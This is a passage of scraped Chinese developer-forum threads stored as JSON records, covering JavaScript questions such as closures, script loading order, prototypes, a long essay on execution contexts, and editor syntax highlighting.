试了几次无效，应该是/usr/local/bin/coffee这个文件屏蔽了最新的版本。", "最近也研究node和coffee 淘宝的 ", " 装包速度挺快的"]},
{"content": ["<div class=\"topic_content\">var aaa = [];<br>aaa[0] = func_x;<br>aaa[1] = func_y;<br>...<br><br>var bbb = [];<br><br>如果我希望像这样定义bbb里面的函数：<br>bbb[0] = function() {<br>  ...<br>  aaa[0]();<br>  ...<br>};<br><br>这个bbb函数定义的循环应该怎么写？</div>", "<div class=\"topic_content\">修改一下，方便能辨识结果<br><br>bbb[0] = function(x) {<br>...<br>aaa[0](x);<br>...<br>};</div>"], "reply": "3", "tittle": "有个函数数组的问题，一下子没想到法子，问问大家", "comment": ["Google一下「闭包函数」受到启发后记得给我一个赞。", "var i;\r", "var mkf = function(arr,idx){\r", "    return function(){\r", "        arr[idx]();\r", "    };\r", "};\r", "for(i=0;i<aaa.length;i++){\r", "    bbb.push(mkf(aaa,i));\r", "}", "\r", " \r", "脑袋的stack over flow了，之前想到partial的时候套了几层没套出来，多谢啦"]},
{"content": ["<div class=\"topic_content\">网站搭建好了，现在开始开发 IOS 平台，需要 Rest API 做接口，之前的 JS 技术回国了，想找一位熟悉 REST API 和 JS 的技术，有意向的 qq 我:75797004，期待大神现身...</div>"], "reply": "5", "tittle": "REST API", "comment": ["是nodejs?\r", "没薪酬没说明没诚意", "有薪酬，但是情况比较复杂，所以具体情况和薪酬可以私聊", "JS技术回国了？所以楼主在国外吗？", " 国内", "谢谢大家关注，有很多人联系我，已经找到合适的人啦"]},
{"content": ["<div class=\"topic_content\">找到Yahoo的一篇很有名的文章: Best Practices for Speeding Up Your Web Site, <a target=\"_blank\" href=\"https://developer.yahoo.com/performance/rules.html\" rel=\"nofollow\">https://developer.yahoo.com/performance/rules.html</a><br><br>里面Put Scripts on Bottom这一段讲到了根据HTTP/1.1 specification，浏览器从一个host name最多只能同时下载两个文件。而script不同，无论从几个host name，只能同时下载一个，不会开始其他的。<br><br>但是经过测试的时候，发现js都是同时下载的，请问这个是浏览器违反规定来提升performance吗？<br><a target=\"_blank\" href=\"&lt;a%20target=\" _blank><img src=\"http://i.imgur.com/WTXhdiT.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a>\" target=\"_blank\"&gt;<img src=\"&lt;a%20target=\" _blank href=\"http://i.imgur.com/WTXhdiT.png\" target=\"_blank\"><img src=\"http://i.imgur.com/WTXhdiT.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\">\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\" /&gt;<br><br>还有，根据http://stackoverflow.com/questions/14328449/when-do-you-put-javascript-in-body-when-in-head-and-when-use-doc-load，js放在头部的话，会在大多数HTML加载之前被加载，而放在底部的话，会等全部HTML加载完再加载javascript，但是实际中也是不一样的：<br>放在底部：<br><a target=\"_blank\" href=\"&lt;a%20target=\" _blank><img src=\"http://i.imgur.com/WTXhdiT.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a>\" target=\"_blank\"&gt;<img src=\"&lt;a%20target=\" _blank href=\"http://i.imgur.com/WTXhdiT.png\" target=\"_blank\"><img src=\"http://i.imgur.com/WTXhdiT.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\">\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\" /&gt;<br><br>放在头部：<br><a target=\"_blank\" href=\"http://i.imgur.com/T72gYlN.png\"><img src=\"http://i.imgur.com/T72gYlN.png\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a></div>"], "reply": "8", "tittle": "关于浏览器并行加载文件，还有 CSS/Javascript 放 head/body 的问题", "comment": ["一般情况来说：是你的浏览器太高端了。\r", "你应该用比较落后的浏览器来测。", " 图片链接有问题？微博图床和imgur都试过了，都是这样子的乱码，请麻烦查看和编辑我的帖子。", "瀑布图，里面看到的只能同时并行下载两个文件，讲的是IE6。\r", "因为当年IE6如此苛刻，才有减少HTTP请求这条规则，才诞生了雪碧图这个优化手段。\r", "\r", "不同版本浏览器，这个并发数不一样。\r", "现在Chrome的并发数已经提高了很多，但依旧使用雪碧图，因为雪碧图合并请求之后，可以减少TCP握手时间，同时，并不是所有公司的静态资源服务器都是那么的牛逼，能够快速响应并返回静态资源。\r", "\r", "图例，wait的时间，可以想象成服务器去找这个资源的时间。用Nginx比Apache会快一点，用了SSD也会比HDD快一点。\r", "\r", " \r", "\r", "假以时日，SPDY的推广，让HTTP请求可以复用TCP的握手。同时，资源服务器上面的Nginx和SSD配合，减少这个wait时间，雪碧图基本上就没有存在意义了。", "刚才瀑布图带了缓存，下面这个是没缓存的\r", "\r", " ", "至于第二个问题，JS放头部，会阻塞HTML。\r", "并不是指阻塞当前这个HTML文件，而是指阻塞html渲染过程中的后续资源文件，例如你BODY中的各种IMG标签，肯定要等这个JS加载完才能加载（IE6下面），如果JS传输时间久，就会造成页面空白期，用户看起来就觉得卡", "你看的文章太旧了", "script那句好像没在specs里面，应该是作者自己说的", " 如果同样的图片链接在文章中出现两次以上就会这样。确实是一个 bug。4 小时内解决。"]},
{"content": ["<div class=\"topic_content\">&lt;embed&gt;<br>__#document<br>____&lt;!DOCTYPE html&gt;<br>____&lt;html&gt;<br>______&lt;body&gt;<br>______&lt;/body&gt;<br>____&lt;/html&gt;<br>&lt;/embed&gt;<br><br>我能获取到embed元素。(没记错的话，embed元素是不能有子元素的，)其childNodes()返回空列表[]。<br><br>用Chrome调试台，强行修改body的属性，给加了一个onclick=\"console.log('cheating');\",有效果。<br><br>请教下，有什么方法能获得内嵌的DOM的document。<br><br>P.S.<br>大坑渗入，挂了两天。这个游戏修改之后，发现坑太大，弃了。<br><a target=\"_blank\" href=\"http://www.acfun.com/a/ac1146409\" rel=\"nofollow\">http://www.acfun.com/a/ac1146409</a><br>这个问题就是改这个游戏发现的。</div>"], "reply": "5", "tittle": "embed 元素内嵌的#document 怎么通过 JavaScript 获取它的 document", "comment": ["感觉这样是跨域操作\r", "chrome会直接拒绝，如果是纯webkit应该是是允许的，我在用node-webkit写应用的时候改过iframe里的css", "\r", "这个帖子都搜到过，不work\r", "\r", "> document.embeds[0]\r", "<embed width=​\"1024\" height=​\"960\" //blabla\r", "\r", "> document.embeds[0].getSVGDocument()\r", "null\r", "\r", "> document.embeds[0].contentDocument\r", "undefined\r", "\r", "\r", " \r", "我在调试模式里面是可以修改的啊，而且我给body加了onclick函数，这个函数就生效了。\r", "我想知道为什么调试模式就可以改。。。", "啊不好意思刚才那个没试过就发上来了\r", "刚才跑了一下属性\r", "Object.getOwnPropertyNames(document.embeds[0]).filter(function(a){return document.embeds[0][a] ;})\r", "发现 document.embeds[0].ownerDocument\r", "就可以拿到", " \r", "这个返回的是外面的document吧。。。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://es6.ruanyifeng.com\" rel=\"nofollow\">http://es6.ruanyifeng.com</a></div>"], "reply": "17", "tittle": "这个站是用什么工具搭的？", "comment": ["如果需要做类似的，搜索一下 Gitbook", "还有这种风格的  \r", "速度好快", "他用的Blog系统也蛮小众的，是一对夫妻开发的，特点是死贵！", "有没有相关的文章介绍呢？我也想制作一个这样的网站，但是 js 知识有限，想不到一个很好的方法。\r", "\r", "我自己做的还是依赖一个文件来索引，不懂得自动化索引文件。", "在找能把带文档结构图的word文档转成这种左侧导航web页面的工具..", " 用的是 ", " 正解", "我佩服的是ruanyifeng 他到底是怎么学的。计算机是他的业余 但是学得这么专业", " 同问", " 简历里面有写吧，学经济的，业余搞IT\r", " 那也太牛了", " 最佩服的ruanyifeng的表达能力，同一个技术点，就他写的文章最通俗易懂。", "学经济的搞IT并不奇怪，我本科学校经管学院的必修“.Net程序设计”、“Web开发”等多门计算机课程", "另外，在一些技术类社团，很多活跃分子和技术大牛是学机械相关专业的"]},
{"content": ["<div class=\"topic_content\">有没有开源的nodejs的web统计框架，例如php有piwik，希望找到个nodejs，方便做一些扩展</div>"], "reply": "3", "tittle": "nodejs 的 web 统计框架", "comment": ["\r", "\r", "看看这个", "这个整理的不错，作者koa成员 ", "Sorry, 我离题 哈哈"]},
{"content": ["<div class=\"topic_content\">初级，或者资深初级程序员，永远是从人的角度去看代码，结果就会产生“变量提升”（variable hoisting）之类不存在的概念，误人误己。比如国外某程序员写的[“进阶教学”博客][1]中，有这么一段代码：<br><br>    function foo() {<br>        return \"A\";<br>    }<br>    <br>    var oldFoo = foo;<br>    <br>    function foo() {<br>        return oldFoo() + \"B\";<br>    }<br><br>    console.log(foo()); // \"AB\"<br><br>它的实际结果是 RangeError: Maximum call stack size exceeded ，而在此之前，这位程序员才刚刚讲完什么是“variable hoisting”。<br><br>本文旨在教会大家进阶级程序员的第一课，即不再从表面的人的角度去看代码，而是从内在的机器的角度去看代码。而从机器的角度出发，Javascript代码的开始相当于一个全局function的调用，而function在调用后并不是马上一行行地运行下去，而是分为两个阶段：初始设定阶段以及正式运行阶段。<br>### 设定阶段 ###<br>例1：<br><br>    console.log( a,b() )<br>    var a = 1<br>    function b() { return 2 }<br><br>首先在执行前，浏览器会先把这些连着的“字符串”（string）分成一个个“字词”（token），期间会自动在有需要的行尾加上分号，然后再把这些字词组织成一个更方便操作的树状结构（AST），最后才开始执行（execution）。<br><br>在设定阶段，会建立一个空的当前代码段（function）的变量表，它可以理解为一个变量名字（identifier）及其内存地址的对照表。<br><br>然后会找到 function 这个字词，把它后面的那个字词(b)作为这个function的名字，再把 { 和 } 这两个字词之间的所有字词(这里为 return 2) 和一些相关属性（property）生成一个javascript里的Function object，作为这个function的值。并把这个值的内存地址和名字作为一个binding（绑定）存到变量表里。假如名字重复，则覆盖掉之前的值。（在最开始的例子中，后面的foo就覆盖掉了前面的foo，导致foo/oldFoo老在调用它自己，结果超出了call stack的大小）<br><br>这之后会找到 var 这个字词，把它后面的那个字词(a)作为这个variable（变量）的名字，这里会先检查这个名字是否已在变量表中，如果在则直接跳过，因此不会覆盖之前的值，如果不在则分配一个内存地址给它，这个内存地址的值为undefined。最后把它们作为又一个binding存到变量表。<br><br>到此设定阶段结束，开始调用 console.log( a,b() ) ，得到的结果为 undefined,2 。<br><br>例2：<br><br>    var a = 1<br>    b(a)<br>    function b(c) { console.log(c) }<br><br>一开始的设定阶段和例1一样，然后先是执行 a = 1，把1赋值给a的内存地址，于是a的值从undefined变为了1。<br>之后调用 b(a) ，这里会暂停 全局代码 的执行，转而开始执行b。<br><br>在b的设定阶段，会先把a的值（1）作为c的值，并存到变量表里，然后由于没有function和var这两个字词，设定阶段结束，开始调用 console.log(c) ，得到的结果为 1 。<br><br>例3：<br><br>    var a = 1<br>    b(2)<br>    function b(c) { <br>        var d = 3<br>        console.log(d,c,a,this) <br>    }<br><br>首先还是先声名b和a。而且在b的声名阶段，会把一个b的一个内部变量（无法直接在Javascript里访问），名字叫[[scope]]，设为指向它声名时所在的变量表，在这里即全局的变量表，a和b以及它们的内存地址就是被存在这里。<br><br>前面提到的function、var还有{ }等符号都属于浏览器认识的关键字词（keyword），当浏览器读到不认识的字词（名字）时，会首先到当前所在的变量表里找，如果没找到，就会去这个[[scope]]，即上一层的变量表里面找，直到[[scope]]为空（null）时，浏览器就会提示 xxx is not defined 。<br><br>这里声名完了后开始执行a=1，之后调用b(2)，，这里会先把把Window，也就是global object（全局对象）的内存地址作为this的值。然后把2赋值给c，之后声名d，于是这一层的变量表即只有c和d。<br><br>这时b的设定阶段结束，开始执行 d=3 和 console.log(d,c,a,this ) ，得到的结果为 3,2,1,Window{ ... } 。<br><br> [总结] <br>在function声名时，会设置它的[[scope]]，即它的上一层的变量表，以及[[FormalParameters]]，即所有形式参数的名字，最后是FunctionBody，即 { 和 } 之间的树形结构化了的代码（AST），并用它生成一个Function object作为以后的调用对象。<br><br>而代码/function的设定阶段为：<br>1.设置this，不同情况下它的地址也会不同。<br>a.对一般function来说，它被设置成global/Window。<br>b.当以objectXX.methodXX() 形式调用时，它被设置成objectXX。<br>c.当以new XX() 形式时，它被设置成一个新的空object。<br>d.当以XX.call()或XX.apply()形式时，它被设置成第一个参数。<br><br>2.设定一个内存地址，它指向这个function声名时的[[scope]]。<br><br>3.设定这一层的变量表。这一步又依次分为a.分配function的内存地址并赋值；b.如果[[FormalParameters]]里的参数名没有重复，则分配它一个内存地址并赋值；c.如果变量名没重复，则分配它一个内存地址但不赋值。<br><br>以上这些共同构成了一个术语叫execution context的东西（代码执行上下文），而设定阶段其实就是把它创建起来的过程。<br><br> [ES5] <br>Ecmascript是Javascript的标准规范，以上的讲解主要是基于它的第3版（ES3），而当前的版本为ES5。（第4版是个失败所以直接到了第5版）<br><br>ES3中的变量表就是一个对象叫做VariableObject，这种实现更容易理解，但在访问多层以上的变量时速度会越来越慢，后来的浏览器进行了优化，不再使用VariableObject，优化后的速度基本不会受层数影响。于是ES5里把VariableObject改为了一种抽象的标准，名字为lexical environment（词语环境）。<br><br>实际这个lexical environment就是由原来指向[[scope]]的内存地址和VariableObject组成，只不过这个内存地址现在叫outer lexical environment（外部词语环境），而VariableObject现在叫environment record（环境记录），而this在ES5标准里也改名叫thisBinding，并与lexical environment共同构成ES5里的execution context。<br><br>ES3和ES5的概念之间的差别其实不大，但却都有一个差别很大的名字，而ES5里还添加了一些这样的东西，因为我认为它们对本文的帮助不大却会大大增加理解难度，所以被我去掉了，想要彻底了解的话可以参考：<br><br><a target=\"_blank\" href=\"http://dmitrysoshnikov.com/ecmascript/es5-chapter-3-1-lexical-environments-common-theory/\" rel=\"nofollow\">http://dmitrysoshnikov.com/ecmascript/es5-chapter-3-1-lexical-environments-common-theory/</a><br><a target=\"_blank\" href=\"http://ecma262-5.com/ELS5_HTML_with_CorrectionNotes.htm#Section_10.2\" rel=\"nofollow\">http://ecma262-5.com/ELS5_HTML_with_CorrectionNotes.htm#Section_10.2</a><br><br>### 运行阶段 ###<br>在function后面 { 和 } 之间的源代码在浏览器转换过后会变成一个 语句列表（StatementList），而它的每一行都是一条语句（Statement），function的运行其实就是对这一条条语句依次evaluate（求值）的过程。<br><br>之所以取名叫evaluate，可能是因为计算机实质上只会做两件事：对值进行 转换（运算）和 传输（载入/保存）。<br><br> [转换] <br>转换通常是通过操作符（operator）实现的，最常见的是+和-等，比较特殊的是==和!等，比较少见的是&gt;&gt;和typeof等。 <br><br>而因为Javascript源代码是以UTF-16为格式的一长串字母和符号（string），比如\"123\"其实是3个16位的\"字母\" 连成的，所以它在运算前会先转成IEEE 754格式的64位浮点数。（而它最小可以转成一个8位的整数）<br>undefined、true、false、数字（45092，1.345等）、string（\"abc\", \"a bc defg\"等）还有“{ ... }”和“[ ... ]”，这种UTF-16格式的值可以直接转换为它真正的值的“词语”被术语称为literal（字面的）。<br><br>除了literal以外，还有两种“词语”会在运算前作转换：<br><br> [a.变量] <br>变量，其实就是一个named value（命名了的值），对变量的转换就是把它的名字变成它的值，方法是去查当前变量表，如果查到，则它的值为绑定的内存地址里的那个值；如果没查到，就去查上层变量表（[[scope]]），如果[[scope]]为空（null）则值它is not defined。<br><br>最近新出版了一本书花了90多页专门讲解scope和closure，（不禁让我回想起那些整本都在讲C语言指针的书）在这里我只用2段话：<br><br>scope即变量表，包括当前的和所有上层的。（scope中文可以翻译为 一眼可以看到的景物，对于function来说，scope就是 一眼可以看到的变量）<br><br>closure，宽泛地说，是function这个概念的一种实现，属于变量的function就是closure，即像其它变量一样可传递和返回的function；（在静态语言的实现中，function无法传递和返回，因为它们的function只有在执行时才得到它需要的变量，执行完后这些变量就消除，而Javascript中function在声名时便生成了一个上层变量表（[[scope]]），只要function不消除这个[[scope]]就不会消除）而具体地说，为了与Javascript中的普通function区分，closure特指那些访问了 [[scope]] 中的变量 的function。<br><br> [b.property] <br>当浏览器看到 a.b 的时候，它不会去变量表里查b的值，因为b是a的一个property。property英文意思除了属性外，更主要的意思是财产，或者说附属品，因此在编程里它的意思可以理解为“附属变量”。<br><br>要理解property，首先要理解object。如果说property对应的是文件，那么object对应的就是文件夹，所谓的“一切皆object”，就是把所有的变量都放到一个object里。虽然智商正常的人应该都不会说：“硬盘里的一切皆文件夹”。<br><br>正确一点的说法是：“一切皆由object组织“。因为object可以理解为一种结构，从图像思维上看，多个object就会形成一个树状的结构，而这种结构可以用来组织任意数量的人或物，比如现实里的物种/图书/商品的分类，军队/公司/政府的编制等等。<br><br>计算机里的数据假如不这么组织，那么一个纯粹的string/array/function就只有它自己，没有property，这样虽然占用的空间少，但像array.length或array.foreach(...)这样方便的操作就无法实现，更不用说 a.b.c.d 这样的链式调用了。<br><br>object，这里暂称它为“变量夹”，特殊的地方在于它里面的变量可以“继承”，使得在子变量夹里可以获取到父变量夹里的变量，但通常一个父变量夹里既有需要被继承的变量，也有不需要被继承的，因此Javascript可以在父变量夹里建一个叫prototype的变量夹，用来存放那些需要被继承的变量。之后子变量夹里会自动建一个叫[[proto]]的内部变量，它的值便是它父变量夹的prototype。（的内存地址）<br><br>任何object的prototype都可以赋值或更改，但[[proto]]是内置的无法直接更改，它取决于object的创建方式：<br><br>    var o = { ... }<br>o.[[proto]]指向Object.prototype，而Object.prototype默认是一个空的object（{}），所以没继承任何变量。（这个Object是Javascript里一个全局object变量的名字，所有Javascript里的object都默认以它为原型）<br><br>    var o = new Xxx( ... )<br>o.[[proto]]指向Xxx.prototype。<br><br>    var o =  Object.create( Xxx, { ... } )<br>o.[[proto]]指向Xxx，Xxx可以是null也可以是任意object。<br><br>所谓的继承，就是当浏览器在当前变量夹找不到某个property时，会自动去它的[[proto]]里面找，依此类推，直到[[proto]]为null为止（property与变量的查找原理一模一样，这就是为什么ES3里会用VariableObject来表示变量表）<br><br>比如浏览器在evaluate a.b 时，会先去变量表找a的内存地址，而它值就是一个变量夹，然后再到这个变量夹里找b。而如果是 a[b] 这种形式，则是会先转换b的值（evaluate），这个值如果不是字符串（string）会强制转换为字符串，然后再到a变量夹里找这个字符串对应的变量。<br><br> [传递] <br>计算机语言中最误导人的运算符无疑是 =，它其实不是在表达一种相等的关系，而是把右边求得的值传递到左边求得的 内存地址 上。我想一个更恰当的符号应该是 ←，比如a ← b，a ← 3+5。<br><br>而值传递在Javascript中具体还分为两种，直接和间接传递。直接传递通常用于数字或可以用数字表示的值，比如true/false和内存地址（假如CPU是32位则内存地址就是一个32位的2进制数，64位CPU则是64位，依此类推），而比较大的、无法用一个数表示的值，则不会被直接传递，而是只传递这个值所在的内存地址。比如<br><br>    a = { a:1,b:2,c:3 }<br>    <br>这里浏览器在把 { a:1,b:2,c:3 } 转换成对应的值后，会返回这个值所在的内存地址，亦即一个数字，然后把这个数字传递给a在变量表里对应的内存地址。<br><br>内存地址之所以是个数字，是因为某种程度上说内存里的每一个字节（byte）都有一个编号，一个1GB（giga byte）的内存就有10亿以上（2的20次方）个编号，而在硬件底层有一个类似于 getMem(编号，大小) 的机器指令，假如编号是123，大小是20，那么这个指令就会把编号123到142里的20个字节取出来。（一台电脑主要有3块内存：CPU内存，显卡内存，声卡内存；想运行软件就要往CPU内存传递数据，想播放声音就要往声卡内存传递数据，想显示图像就要往显卡内存传递数据）<br><br>Javascript中除了 =，还有一些其它的值传递，它们理论上说都应该改为用←来表示：<br>{ a: 1,b: 'abc' } ：{ a← 1,b← 'abc' } &lt;/td&gt;<br>a(1,'abc') ：a← 1,'abc'<br>return 1 ：1 →<br><br>CPU里有一个寄存器（功能与内存一样，但更快也更贵，只用来存放最经常转换/传递的值），它的值是当前正在执行的机器指令的内存地址，当浏览器往这里传递一个 代表内存地址的数字 时，程序就会跳转到那个地址开始继续执行里面的指令，所以if、while、switch等语句实质上也是在传递值。<br><br>具体Javascript里共有多少种操作符和语句，可以参考 [Expressions][2] 和 [Statements][3]。<br><br> [理论与实践] <br>这篇文章里总结了我认为Javascript中最重要的理论知识，应该说理解之后除了EMCA标准外就不用再看理论相关的书或文章了，这时应把时间花在动手实践上，去熟悉和掌握 原生的DOM API、第3方的库/框架/插件、代码的组织与测试等等。<br><br>----------<br><br><br>  [1]: <a target=\"_blank\" href=\"http://blog.buymeasoda.com/advanced-javascript-fundamentals/\" rel=\"nofollow\">http://blog.buymeasoda.com/advanced-javascript-fundamentals/</a><br>  [2]: <a target=\"_blank\" href=\"http://es5.github.io/#x11\" rel=\"nofollow\">http://es5.github.io/#x11</a><br>  [3]: <a target=\"_blank\" href=\"http://es5.github.io/#x12\" rel=\"nofollow\">http://es5.github.io/#x12</a></div>"], "reply": "4", "tittle": "Javascript 语义详解 - 从浏览器角度理解代码", "comment": ["先收藏。", "貌似通篇只是用了一个例子来否定\r", "“变量提升”（variable hoisting），而我觉得这个例子好像和“变量提升”没什么关系。。。\r", "后面的都是大路货\r", "不过总结的还是不错", " 哪里还能看到这种“大路货”？", " @", " 这连大路货的等级都不够，生造概念，言语晦涩，漏洞百出，自以为是。随便个大路货比这强多了"]},
{"content": ["<div class=\"topic_content\">function Parent(name){<br>  this.name = name;<br>  return this.init;<br>}<br><br> Parent.prototype = {<br>    name : '',<br>    init : function(){<br>       return this;<br>    }<br>}<br><br> Parent.prototype.son = {}<br><br>======================<br>在 Parent.prototype.son 的方法中，如何访问Parent.prototype.name这个属性。</div>"], "reply": "4", "tittle": "js prototype 中 js 指针的访问。", "comment": ["prototype 的属性可以看作是 Parent 的类成员。\r", "类成员(son)想访问另一个类成员(name)只能以类(Parent)开头了。", "严格来说也不能算类成员……\r", "\r", "为什么要把一个对象放在 prototype 里呢？你的 use case 是什么？", "当作静态方法访问，或者把son的原型指向parent的原型，好久没写js了，记不得了", "感谢楼上几位的回复。\r", "\r", "我这种写法本身有弊端。结贴，换另一种写法。"]},
{"content": ["<div class=\"topic_content\">高性能JavaScript推荐cssText，可维护JavaScript不推荐cssText，大家的观点是怎样的？</div>"], "reply": "6", "tittle": "大家平时用 cssText 吗？", "comment": ["用 Class 更容易维护吧", " 对，所以可维护JavaScript不推荐cssText", "不用。", "不要用JS操作CSS，没有原因，就是不要用。\r", "高性能可以通过build做到。", "js最大的问题不是性能问题,象jspref测试中成千上万个dom操作在实际应用场景中是很少见的,主要的问题在于兼容写法", "在高性能和可维护性上，可能需要自己balance"]},
{"content": ["<div class=\"topic_content\">很早就有疑问 Sublime Text 默认的 JavaScript 高亮效果有点怪异，比如 函数名/参数/属性/方法 等等在同一 js 文件中的高亮效果并不统一。也许是我菜，搞不懂结构（刚啃了一个星期的犀牛书，正在借助各种源码学习）。打算写个新高亮包深入理解 JS 的语言结构，并且设计更智能的自动补完提示。<br><br>如果大家有同样的需求，能否说说不满意的地方。如果大家都说是完美高亮，那就是我的问题了。</div>", "<div class=\"topic_content\">一口气花了三个多小时打的草稿，距离目标还很遥远，先敲定高亮效果，再尝试智能提示<br><br><a target=\"_blank\" href=\"https://github.com/P233/Syntax-highlighting-for-JavaScript\" rel=\"nofollow\">https://github.com/P233/Syntax-highlighting-for-JavaScript</a> <br><br>欢迎吐槽 :)</div>", "<div class=\"topic_content\">刚刚更新了两款 Sublime Text 插件：<br><br><a target=\"_blank\" href=\"https://sublime.wbond.net/packages/Emmet%20Css%20Snippets\" rel=\"nofollow\">https://sublime.wbond.net/packages/Emmet%20Css%20Snippets</a><br><a target=\"_blank\" href=\"https://sublime.wbond.net/packages/Syntax%20Highlighting%20for%20Sass\" rel=\"nofollow\">https://sublime.wbond.net/packages/Syntax%20Highlighting%20for%20Sass</a><br><br>下周开始专心写这个插件</div>"], "reply": "40", "tittle": "各位用 Sublime Text 写 JavaScript 的同学，对默认的高亮效果满意吗？", "comment": ["高亮效果确实不咋地。。。。", "NodeJS 受不了……", " \r", " 这个周末折腾一下，目测难度不大，如果能提供一些建议就更好了 :)", " 欢迎开发!!", " 同。 NodeJS 简直痛苦。 module.exports 都不支持高亮。", " 啊没注意到你说要开发高亮包……\r", "好吧自从侥幸得到了 Atom 的 key 之后就一直用 Atom 了，因为无弹窗哈哈。不过越用越感觉不如 Sublime Text。考虑迁移回来。", "写 JS 居然不用 WebStorm？", " 多谢朱一大大支持\r", "\r", " 把 module 作为关键词，exports 作为属性高亮怎么样？\r", "\r", " 其实 TextMate/Sublime 高亮文件转 Atom 只需要一个命令", " 买个授权就不弹窗了 ...嘻嘻 \r", "其实 Chocolat也是不错的。 js的语法提示杠杠的 现在貌似也能装插件了。", " - -. 这个不用谢吧... 我只是说了句欢迎..", "Chocolat 写 JavaScript 不错哦", "支持支持，最近学node中", "Sublime Text 写js太不爽，补全特别拙计！", "有个 ES6 的包, 比自带的 JS 好看些", "还好吧，有高亮插件的", " \r", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "打好了草稿，明天继续折腾", " 尝试过，不太习惯", " 这个吧 ", " 尝试了一下，离想象中的还差一点", "买个webstorm吧。貌似也就200多。。。", "再尝试WebStorm吧，世上没有更好的 JS IDE", " \r", " 有点慢，敲几个字 CPU 就飙升了 :(\r", "\r", "目前草稿的高亮效果已经跟 WebStorm 差不多了。打算加入智能补完，比如输入 Math 后紧跟的自动补完只有 round() random() 等等，以及代码跳转等功能。好好挖掘一下，Sublime Text 能够实现很多 WebStorm 的功能。\r", "\r", "另外，写高两包的乐趣在于熟悉语言的各种用法 :)", "加油！支持一个", "说sublime不好的，应该都是没有深入使用过的吧。。。sublime编辑js很爽的，函数名/参数/属性/方法 高亮不一样不影响开发吧。。。ctrl＋r可以直接搜索当前文件的函数。sublime的go anywhere用过吗？比较过sublime和其他编辑器打开几十兆文本文件的性能吗？喜欢js智能提示的人，要么是对js不熟悉的，要么是强大IDE重度依赖者吧？", " Thanks\r", " sublime text 的 goto 功能非常好用", "话说我在Linux下用sublime经常崩溃，似乎是自动完成引起的，有人有类似情况吗》", "还得考虑js混合在html里的情况。", "怎么没有截图。。", "古人云：\r", "\r", "曾经沧海难为水，除却WS不是云。\r", "\r", "楼主，快到碗里来！", "我觉得 IDE 略重，Sublime 完成一般的工作效率还是可以的。建议楼主写一个配色生成工具，一次性解决问题", " Sublime Sublime没有令人满意的重构功能，就凭这一点就无法满足我的需求。另外我还遇到过由于项目目录太深Sublime无法显示的问题，还有Ubuntu下Sublime里无法输入中文的问题。\r", "JS智能提示？哪个编辑器没有这功能？用IDE不是为了提示，是为了代码质量。我用WebStorm的时候我故意关闭智能提示我会乱说？\r", " WebStorm 有哪些过人之处？\r", "WebStorm 有很多功能 Sublime 是永远无法提供的？为什么？因为一旦Sublime提供了这些功能，它就不是编辑器，而是一个IDE了。那么它的「快速」的特点就没有了。", "jetbrain的ide真是没得说", "monokai很赞的~个人觉得无二", " 是不是插件造成的，一个一个排查一下？\r", "\r", " 如果自带的能够实现，这个也不是问题，HTML 包里应该有留给 JS 以及 CSS 的 scope\r", "\r", " scope 命名还在调整中，调整完毕后再截图吧。\r", "\r", "贴一下昨天写完的插件功能录像\r", "\r", "\r", "\r", "这里用到了 Emmet，Emmet CSS Snippets，以及 Syntax Highligthing for Sass\r", "\r", "几个显著的改进是，不需要自动补完的地方不会提示，提示完属性后，只提提示属性值，将多余的提示降低到最少。只要要敲 2-4 个字母就可以 trigger 需要的代码，熟练之后哪里会出现哪些提示都很清楚了，想不起来也只需要扫一眼。\r", "\r", "顺便一说， Emmet CSS Snippts 原名是 Zen Coding Snippets，几乎跟 Emmet 是同时发布，然后跟 Emmet 作者沟通过几次，之后 Emmet 也加入了提示功能，不知道是作者本来有这个计划，还是这个包给了他灵感。\r", "\r", "但是 Emmet 的补完有几处不足让我坚持用 Sublime 原生的 snipptes：1. 会覆盖自定义 Snippets 如果有大量的自定义补完就很不方便了， 2. 略影响性能， 3. 对 scope 的判定跟高亮包不一致\r", "\r", " 请看上图，我是自动补完的重度用户，倒不是因为记不住，而是提高效率。\r", "\r", "WebStorm 机器带不动", " 忘了 @ 了，看上一句 机器带不动\r", "\r", "\r", " 还真写过配色工具，很久以前的，已经很久没管了 ", " 求指点重构功能，菜鸟略不懂", " 配色工具可以模仿一下各种 IDE，然后多种配置文件导出，就 OK 了，再复杂的功能也不必要，毕竟不是用来折腾的", " 也不算太折腾把，庖丁解牛把 JS 语言的结构拆分一下，当做学习了", " 入过此坑，琢磨了一个半残废的 highlight 功能", " 求参考", " 很烂的代码，已经丢掉了"]},
{"content": ["<div class=\"topic_content\">Chrome自带的Flash插件简直令人发指，在禁用了之后感觉Chrome轻盈了很多，但是国内多数视频网站也一并挂掉了。于是想写个flv的播放器，html5中js已经可以读取buffer array，这样就可以操作最底层的二进制源数据，理论上从底层进行解码也不是什么难事了，不知大家怎么看。</div>"], "reply": "2", "tittle": "想写个 flv 的播放器", "comment": ["不如flash\r", "搜索ffmpeg html5", "加油 如果可以做到的话"]},
{"content": ["<div class=\"topic_content\">这还是其他语言里面的概念，JS 里面没有，所以只能自己处理传进来的参数。<br><br>比如 superagent 的主入口：<br><br><br>function request(method, url) {<br>  // callback<br>  if ('function' == typeof url) {<br>    return new Request('GET', method).end(url);<br>  }<br><br>  // url first<br>  if (1 == arguments.length) {<br>    return new Request('GET', method);<br>  }<br><br>  return new Request(method, url);<br>}<br><br>这里要自己去处理 method 可能传入的是 url，url 可能传入的是 callback 这样的情况。当我要代理这个函数的时候，比如说，给 url 统一加 prefix，我得完全 copy 这个函数！————至少是处理重载的这部分代码。<br><br>function uest(method, url) {<br>  var r;<br><br>  // callback<br>  if ('function' == typeof url) {<br>    r = new request.Request('GET', p(method)).end(url);<br>  }<br><br>  // url first<br>  else if (1 == arguments.length) {<br>    r = new request.Request('GET', p(method));<br>  }<br><br>  else r = new Request(method, p(url));<br><br>  return augment(r);<br>}<br><br>哎~</div>"], "reply": "16", "tittle": "JavaScript 现在最令人不爽的就是函数的重载了", "comment": ["类似的情况，tj 的代码中经常会有判断函数的 arity 来给不同反应的，也就是函数对象的 length 属性，也就是说比如\r", "\r", "function (a, b, c) {}\r", "\r", 